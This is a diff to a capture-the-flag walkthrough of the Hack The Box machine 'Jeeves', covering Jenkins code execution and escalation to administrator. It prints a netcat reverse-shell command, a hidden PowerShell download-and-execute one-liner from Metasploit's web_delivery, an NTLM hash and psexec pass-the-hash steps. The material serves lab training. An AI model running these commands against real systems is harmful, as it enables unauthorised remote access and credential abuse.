@@ -20,8 +20,11 @@ http://10.10.10.63:50000/askjeeves/securityRealm/user/admin/
 
 1. On Jenkins create a new Item “Execute Windows bash command” and select “Freestyle Project”
 2. Select “Add building Step” and select  “Execute Windows bash command” 
-3. On the bash console type powershell wget "http://10.10.14.14/nc.exe" -outfile "nc.exe" 
-    nc.exe -e cmd.exe 10.10.14.14 9999
+3. On the bash console type 
+```shell
+powershell wget "http://10.10.14.14/nc.exe" -outfile "nc.exe" 
+nc.exe -e cmd.exe 10.10.14.14 9999
+```
 4. Start apache and place nc.exe for download 
 5. Set up nc to listen up
 6. Run the shell on jenkins 
@@ -32,7 +35,7 @@ Optional and recommended: you can also create a msfvenom shell and multihadler t
 1. On Jenkins, create a reverser Groovy shell on the “script console” under “manage Jenkins” tab and run it
 2. Set up an nc listener to recieve the shell
 3. Spawn a meterpreter shell:
-```
+```shell
 use exploit/multi/script/web_delivery
 msf exploit(multi/script/web_delivery) > set target 2
 msf exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
@@ -41,7 +44,7 @@ msf exploit(multi/script/web_delivery) > set srvhost 10.10.14.28
 msf exploit(multi/script/web_delivery) > exploit
 ```
 4. We paste the following generated code into the netcat listener and meterpreter session should be created
-```
+```shell
 powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.14.34:8080/MHGDnJdwHT');
 powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.14.34:8080/MHGDnJdwHT');
 ```
@@ -54,7 +57,7 @@ powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRe
 5. Install Keepass2 : apt-get install keepass2
 6. NTLM hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 7. Using msf windows smb to connect using the keepass creds   
-```
+```shell
 use exploit/windows/smb/psexec
 msf exploit(windows/smb/psexec) > set rhost 10.10.10.63
 msf exploit(windows/smb/psexec) > set smbuser administrator
@@ -75,5 +78,7 @@ more < hm.txt:root.txt
 # References
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy
+
 https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
+
 https://www.hackingarticles.in/hack-the-box-challenge-jeeves-walkthrough/
